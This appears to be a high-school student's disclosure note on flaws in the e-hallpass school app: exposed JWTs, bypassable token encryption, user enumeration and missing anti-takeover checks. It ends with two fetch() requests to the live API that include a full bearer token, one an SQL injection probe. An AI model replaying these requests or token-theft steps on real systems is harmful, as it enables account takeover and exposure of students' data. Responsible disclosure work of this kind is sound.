# Blue Linden, Web Manager at The Verdict, 9th grade
### bluelinden.art + theverdictjhs.com/blue

## Notification of Publication
As the second part of a two-part series on e-hallpass and how it will affect Justice High School, we'll be writing about how these issues were found as it's a topic of interest within Fairfax County Public Schools faculty. The first part doesn't talk about them in detail but it does mention their existence. The second part is a more in-depth look, and will contain slightly more detailed information of how these could have been exploited. I will personally block publication of the second part until I can personally confirm all issues mentioned both in this document and in that article have been resolved. 

## The Issues
1. The JSON Web Token used for authentication is accessible in plain text in LocalStorage as 'accessToken'
    - Discovered on 2/08/23
    - Severity - High
    - Status - Fixed
2. The newly added encryption on the JWT is easily bypassable using code bundled in the e-hallpass client and a 'tlasphe' cookie
    - Discovered on 3/21/23
    - Severity - High
    - Status - Not yet disclosed
3. Sections of the app's client code can be modified to show administrator views and options without the need for an admin account. API calls to privileged endpoints will fail as usual, however user enumeration of every account and email address is possible from this state, even without a privileged account.
    - Discovered on 2/07/23
    - Severity - Low
    - Status - Not yet disclosed
4. No checks are used to detect and prevent credential stealing on the server-side, so multiple accounts can be logged in on one access token, no matter the device, location, or IP address.
    - Discovered on 2/07/23
    - Severity - Medium
    - Status - Partially disclosed

## Why they're important
1. **JWT Plaintext:** *this issue has already been resolved.* The JWT used for authentication is stored in plain text, meaning that anyone with access to a logged-in computer can just copy the token and send it to themself somehow, allowing immediate access to another account without re-authentication.
2. **JWT Encryption:** This issue has the exact same implications as the first, which are that anyone with physical access to a computer logged into e-hallpass can steal the JWT and use it to impersonate the user. It requires more setup than the previous issue, and it took me about an hour of work in total to reverse-engineer, using a webpack-generated bookmarklet to inject the code into the page.
3. **App client admin checks:** This issue may potentially expose insecure endpoints if any are made in the future, and I'm honestly not sure how important it is. However, it does allow for user enumeration via a dropdown list containing student names and email addresses. All other administration endpoints are thankfully secured and gated as expected, returning 403s when accessed with a student account.
4. **Server-side anti-takeover:**

# Credits
## People
* blue linden
* [The Verdict's staff](https://theverdictjhs.com/staff)
* The Justice High School GSA

## Tooling
### Discovery
* Chrome DevTools
* [jwt.io](https://jwt.io) (JWT decoder + validator)
### Exploit Prototyping
* Visual Studio Code
* GitHub Copilot (AI-assisted code completion)
* Webpack (Javascript bundler)
* Bookmarkletify (bookmarklet generator for VS Code)

```javascript
fetch('https://ehpv2.e-hallpass.com/api/v5/passes', {
  method: 'POST',
  body: JSON.stringify({
"from_id":'3844546',"from_type":"App\\Models\\User","to_id":'3844547',"to_type":"App\\Models\\User","comment":"testing testing hacky hacky sql injection full account takeover blah blah blah hi admins i'm probing more vulnerabilities and i promise i'll tell y'all all about it soon don't mind meeeeee - blue linden"
  }),
  headers: {
    'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': 'application/json;',
      'Content-Length': '312',
'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
'Access-Control-Allow-Origin': '*',
'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiZjJiZWMwM2ExOGNmYjA4NThjMjFmYThhZWM1NTlkNTlkYzU5YTQ4ZjEwMjUxYTM0Mzc5MWFhNTNlYTAwMTY5MDZkYTZkNDgyYjk2NDIxN2MiLCJpYXQiOjE2Nzk1MjI4NTQuOTU5ODMxLCJuYmYiOjE2Nzk1MjI4NTQuOTU5ODMzLCJleHAiOjE2Nzk1NTE2NTQuOTU2NDQ1LCJzdWIiOiIzODI0MDk0Iiwic2NvcGVzIjpbXX0.CY2jMaWo8dC19a3jT9zrvDlcHQROQOT1KVCYXxIJF1zeITn_Zo-Y7wVpnRbihGTxA-Cwkc1l2V5V7Z20-vn-3rr7eqWCZw8CdSlam6rBErLZY655d7GeZ117djp04VyPnJN94BFjdNTyfxUaEbeN1mM0H_3v9lwDenTof3FtGJOYSbEGcyx6oTndLLk8j1MuItnFWx5b_5hVcuwtWQ4zieFhmVBXYT1lpO5B22hdj_pxSMvYyHbkdM4IlKbO_OEVAwFF-RAJlV6rmqbtUA7yhsRhXGRWsK8FwO0EASSZ5dtS0IHx1BphJfN5CERGO_X8ONsdLgdZ147jd0GF2HXpDJCtbNatfhHq0oaUNv90qpt_elxX1jstDtpr-XEIpCtaMb1szq2S_-N31sixjxh-4XuX5oCChC68PP5fpZKZKsI44iH2Vwz5yg9sr5-t7jxjgUA0jB1xY4tl-jWtmKWe-tecyaTR2UAKKDFB4Ci5YH6PI5RzQc0pSaI4GisqM6TpljCQQpUHw7qxztrX5egAuRtOxUOHz9Jo-mZoSZaylUYpazJnM46sDZYq86SZ04Asbr29u5kmVxT8x3yd7yASnfAMKW6X70tvNVMO3ISa2H4Ygc30NI2Uc0-1mfHuSbnDhrfHiNvi1cBds4kFhUTDvjU4klciaDVLHdDjcL7jiWs',
'Cache-Control': 'no-cache',
'Connection': 'keep-alive',
'DNT': '1',
'Host': 'ehpv2.e-hallpass.com',
'Origin': 'https://e-hallpass.com',
'Pragma': 'no-cache',
'Referer': 'https://e-hallpass.com/',
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-site',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
  }
})
.then(res => res.json())
.then(console.log);
```

```javascript
fetch('https://ehpv2.e-hallpass.com/api/v5/passes', {
  method: 'POST',
  body: JSON.stringify({
"from_id":'\'',"from_type":"","to_id":'2',"to_type":"App\\Models\\User","comment":"testing testing hacky hacky sql injection full account takeover blah blah blah hi admins i'm probing more vulnerabilities and i promise i'll tell y'all all about it soon don't mind meeeeee - blue linden"
  }),
  headers: {
    'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': 'application/json;',
      'Content-Length': '312',
'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
'Access-Control-Allow-Origin': '*',
'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiZjJiZWMwM2ExOGNmYjA4NThjMjFmYThhZWM1NTlkNTlkYzU5YTQ4ZjEwMjUxYTM0Mzc5MWFhNTNlYTAwMTY5MDZkYTZkNDgyYjk2NDIxN2MiLCJpYXQiOjE2Nzk1MjI4NTQuOTU5ODMxLCJuYmYiOjE2Nzk1MjI4NTQuOTU5ODMzLCJleHAiOjE2Nzk1NTE2NTQuOTU2NDQ1LCJzdWIiOiIzODI0MDk0Iiwic2NvcGVzIjpbXX0.CY2jMaWo8dC19a3jT9zrvDlcHQROQOT1KVCYXxIJF1zeITn_Zo-Y7wVpnRbihGTxA-Cwkc1l2V5V7Z20-vn-3rr7eqWCZw8CdSlam6rBErLZY655d7GeZ117djp04VyPnJN94BFjdNTyfxUaEbeN1mM0H_3v9lwDenTof3FtGJOYSbEGcyx6oTndLLk8j1MuItnFWx5b_5hVcuwtWQ4zieFhmVBXYT1lpO5B22hdj_pxSMvYyHbkdM4IlKbO_OEVAwFF-RAJlV6rmqbtUA7yhsRhXGRWsK8FwO0EASSZ5dtS0IHx1BphJfN5CERGO_X8ONsdLgdZ147jd0GF2HXpDJCtbNatfhHq0oaUNv90qpt_elxX1jstDtpr-XEIpCtaMb1szq2S_-N31sixjxh-4XuX5oCChC68PP5fpZKZKsI44iH2Vwz5yg9sr5-t7jxjgUA0jB1xY4tl-jWtmKWe-tecyaTR2UAKKDFB4Ci5YH6PI5RzQc0pSaI4GisqM6TpljCQQpUHw7qxztrX5egAuRtOxUOHz9Jo-mZoSZaylUYpazJnM46sDZYq86SZ04Asbr29u5kmVxT8x3yd7yASnfAMKW6X70tvNVMO3ISa2H4Ygc30NI2Uc0-1mfHuSbnDhrfHiNvi1cBds4kFhUTDvjU4klciaDVLHdDjcL7jiWs',
'Cache-Control': 'no-cache',
'Connection': 'keep-alive',
'DNT': '1',
'Host': 'ehpv2.e-hallpass.com',
'Origin': 'https://e-hallpass.com',
'Pragma': 'no-cache',
'Referer': 'https://e-hallpass.com/',
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-site',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
  }
})
.then(res => res.json())
.then(console.log);
```